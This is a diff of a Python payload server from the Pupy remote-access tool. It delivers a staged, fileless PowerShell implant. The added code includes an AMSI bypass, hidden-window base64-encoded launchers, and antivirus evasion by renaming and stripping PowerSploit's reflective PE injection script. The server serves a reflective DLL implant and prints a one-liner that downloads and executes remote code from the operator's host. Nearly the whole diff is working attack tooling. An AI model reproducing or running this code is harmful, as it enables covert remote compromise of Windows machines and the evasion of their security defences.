@@ -2,104 +2,110 @@
 # -*- coding: UTF8 -*-
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 import os.path
-import base64
 from pupylib.utils.term import colorize
-import textwrap
 import random, string
-import time
-from pupygen import get_edit_pupyx86_dll, get_edit_pupyx64_dll 
+from pupygen import get_edit_pupyx86_dll
 try:
     import ConfigParser as configparser
 except ImportError:
     import configparser
 from ssl import wrap_socket
+from base64 import b64encode
+import re
 
 ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))
 
-def pad(s):
+url_random_one = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
+url_random_two = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
+url_random_three = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
+
+def obfs_ps_script(script):
     """
-    Performs PKCS#7 padding for 128 bit block size.
+    Strip block comments, line comments, empty lines, verbose statements,
+    and debug statements from a PowerShell source file.
     """
-    return str(s) + chr(16 - len(str(s)) % 16) * (16 - len(str(s)) % 16) 
+    # strip block comments
+    strippedCode = re.sub(re.compile('<#.*?#>', re.DOTALL), '', script)
+    # strip blank lines, lines starting with #, and verbose/debug statements
+    strippedCode = "\n".join([line for line in strippedCode.split('\n') if ((line.strip() != '') and (not line.strip().startswith("#")) and (not line.strip().lower().startswith("write-verbose ")) and (not line.strip().lower().startswith("write-debug ")) )])
+    return strippedCode
 
-from Crypto.Cipher import AES
-def aes_encrypt(data, key):
-    IV="\x00"*16
-    cipher = AES.new(key, AES.MODE_CBC, IV)
-    return cipher.encrypt(pad(data))
+def create_ps_command(ps_command, force_ps32=False, nothidden=False):
+    ps_command = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
+    try{{ 
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
+    }}catch{{}}
+    {}
+    """.format(ps_command)
 
+    if force_ps32:
+        command = """$command = '{}'
+        if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64') 
+        {{
+            
+            $exec = $Env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded ' + $command
+            IEX $exec
+        }}
+        else
+        {{
+            $exec = [System.Convert]::FromBase64String($command)
+            $exec = [Text.Encoding]::Unicode.GetString($exec)
+            IEX $exec
+        }}""".format(b64encode(ps_command.encode('UTF-16LE')))
+        
+        if nothidden is True:
+            command = 'powershell.exe -exec bypass -window maximized -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
+        else:
+            command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
 
-PS1_DECRYPT="""
-[Reflection.Assembly]::LoadWithPartialName("System.Security")
-function AES-Decrypt($Encrypted, $Passphrase) 
-{ 
-    $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider
-    $IV = New-Object Byte[] 16
-    $AES.Mode="CBC"
-    $AES.KeySize=128
-    $AES.Key=[Text.Encoding]::ASCII.GetBytes($Passphrase)
-    $AES.IV = $IV
-    $AES.Padding = "None"
-    $d = $AES.CreateDecryptor()
-    $ms = new-Object IO.MemoryStream @(,$Encrypted)
-    $cs = new-Object Security.Cryptography.CryptoStream $ms,$d,"Read"
-    $count = $cs.Read($Encrypted, 0, $Encrypted.Length)
-    $cs.Close()
-    $ms.Close()
-    $AES.Clear()
-    $Encrypted[0..($Encrypted.Length - $Encrypted[-1] - 1)]
-} 
-"""
+    elif not force_ps32:
+        if nothidden is True:
+            command = 'powershell.exe -exec bypass -window maximized -encoded {}'.format(b64encode(ps_command.encode('UTF-16LE')))
+        else:
+            command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(ps_command.encode('UTF-16LE')))
+
+    return command
 
 class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
     def do_GET(self):
-        if self.path=="/p":
+        # print self.server.random_reflectivepeinj_name
+        if self.path=="/%s" % url_random_one:
             self.send_response(200)
             self.send_header('Content-type','text/html')
             self.end_headers()
-            pe_bootloader=PS1_DECRYPT+"\n"+(textwrap.dedent("""
-            $p="%s"
-            $rpi=(((New-Object System.Net.WebClient).DownloadData("http://%s:%s/rpi")))
-            $path="b64"
-            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8){$path="b32"}
-            $raw=([Byte[]]((New-Object System.Net.WebClient).DownloadData("http://%s:%s/"+$path)))
-            iex([System.Text.Encoding]::UTF8.GetString( (AES-Decrypt $rpi $p)))
-            Write-Output "DLL received"
-            $raw=AES-Decrypt $raw $p
-            Write-Output "Reflective DLL decrypted"
-            [GC]::Collect()
-            %s -ForceASLR -PEBytes $raw #-Verbose
-            """%(self.server.aes_key, self.server.link_ip, self.server.link_port, self.server.link_ip, self.server.link_port, self.server.random_reflectivepeinj_name)))
-            self.wfile.write(pe_bootloader)
-            print colorize("[+] ","green")+" powershell script stage1 served !"
 
-        elif self.path=="/rpi":
-            #serve the powershell script
+            launcher = """
+            IEX (New-Object Net.WebClient).DownloadString('http://{server}:{port}/{url_random_two}');
+            $WebClient = New-Object System.Net.WebClient;
+            [Byte[]]$bytes = $WebClient.DownloadData('http://{server}:{port}/{url_random_three}');
+            {function_invoke} -ForceASLR -PEBytes $bytes""".format(  
+                                                                                server=self.server.link_ip,
+                                                                                port=self.server.link_port,
+                                                                                function_invoke=self.server.random_reflectivepeinj_name,
+                                                                                url_random_two=url_random_two, 
+                                                                                url_random_three=url_random_three
+                                                                            )
+            launcher = create_ps_command(launcher, force_ps32=True, nothidden=False)
+            self.wfile.write(launcher)
+            print colorize("[+] ","green")+" Powershell script stage1 served !"
+        
+        elif self.path=="/%s" % url_random_two:
             self.send_response(200)
-            #self.send_header('Content-type','text/html')
             self.send_header('Content-type','application/octet-stream')
             self.end_headers()
             code=open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read()
             code=code.replace("Invoke-ReflectivePEInjection", self.server.random_reflectivepeinj_name) # seems to bypass some av like avast :o)
-            d=aes_encrypt(code, self.server.aes_key)
-            self.wfile.write(d)
+            self.wfile.write(obfs_ps_script(code))
             print colorize("[+] ","green")+" powershell Invoke-ReflectivePEInjection.ps1 script served !"
-        elif self.path=="/b32":
-            #serve the pupy 32bits dll to load from memory
+
+        elif self.path=="/%s" % url_random_three:
             self.send_response(200)
             self.send_header('Content-type','application/octet-stream')
             self.end_headers()
-            print colorize("[+] ","green")+" generating x86 reflective dll ..."
-            self.wfile.write(aes_encrypt(get_edit_pupyx86_dll(self.server.payload_conf), self.server.aes_key))
-            print colorize("[+] ","green")+" pupy x86 reflective dll served !"
-        elif self.path=="/b64":
-            #serve the pupy 64bits dll to load from memory
-            self.send_response(200)
-            self.send_header('Content-type','application/octet-stream')
-            self.end_headers()
-            print colorize("[+] ","green")+" generating amd64 reflective dll ..."
-            self.wfile.write(aes_encrypt(get_edit_pupyx64_dll(self.server.payload_conf), self.server.aes_key))
-            print colorize("[+] ","green")+" pupy amd64 reflective dll served !"
+            raw = get_edit_pupyx86_dll(self.server.payload_conf)
+            self.wfile.write(raw)
+            print colorize("[+] ","green")+" pupy dllx86 script served !"
+
         else:
             self.send_response(404)
             self.end_headers()
@@ -134,7 +140,9 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=Fa
                     raise
         print colorize("[+] ","green")+"copy/paste this one-line loader to deploy pupy without writing on the disk :"
         print " --- "
-        oneliner=colorize("powershell.exe -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString('http://%s:%s/p')\""%(link_ip, port), "green")
+        oneliner=colorize("powershell.exe -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString('http://%s:%s/%s')\""%(link_ip, port, url_random_one), "green")
+        # This line could work check when proxy is used (have to be tested)
+        # oneliner=colorize("powershell.exe -w hidden -noni -nop -c $K=new-object net.webclient;$K.proxy=[Net.WebRequest]::GetSystemWebProxy();$K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $K.downloadstring('http://%s:%s/pa')"%(link_ip, port), "green")
         print oneliner
         print " --- "
 
